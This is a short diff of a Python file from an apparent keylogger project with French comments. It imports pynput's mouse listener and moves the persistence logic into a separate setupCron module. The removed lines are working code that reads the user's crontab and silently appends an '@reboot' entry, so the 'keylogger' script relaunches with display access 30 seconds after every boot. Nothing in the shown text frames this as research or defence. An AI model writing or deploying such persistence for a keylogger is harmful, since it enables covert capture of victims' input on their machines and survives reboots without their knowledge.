@@ -10,29 +10,11 @@ import subprocess
 from pynput import mouse
 import time
 import os
-
+from TacheProgrammees import setupCron
 
 #--------DÉBUT TÂCHES PROGRAMMÉES---------------
 
-# Chemin vers le script Python
-python_script = os.getcwd()+'/keylogger'
-
-path_env = '../'
-
-# Commande crontab pour exécuter le script Python au démarrage avec temporisation et affichage graphique
-cron_job = f"@reboot sleep 30 && DISPLAY=:0 {path_env} {python_script} >> /home/ubuntu/cronlog.txt 2>&1"
-
-# Obtenir la crontab actuelle de l'utilisateur
-current_cron = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
-
-# Vérifier si le script est déjà dans la crontab
-if cron_job not in current_cron.stdout:
-    # Ajouter la nouvelle tâche à crontab
-    new_cron = current_cron.stdout + cron_job + "\n"
-    subprocess.run(['crontab', '-'], input=new_cron, text=True)
-    print("Le script Python a été ajouté à crontab pour être exécuté au démarrage.")
-else:
-    print("Le script Python est déjà dans crontab.")
+setupCron.setupCron()
 
 #--------FIN TÂCHES PROGRAMMÉES----------------
 
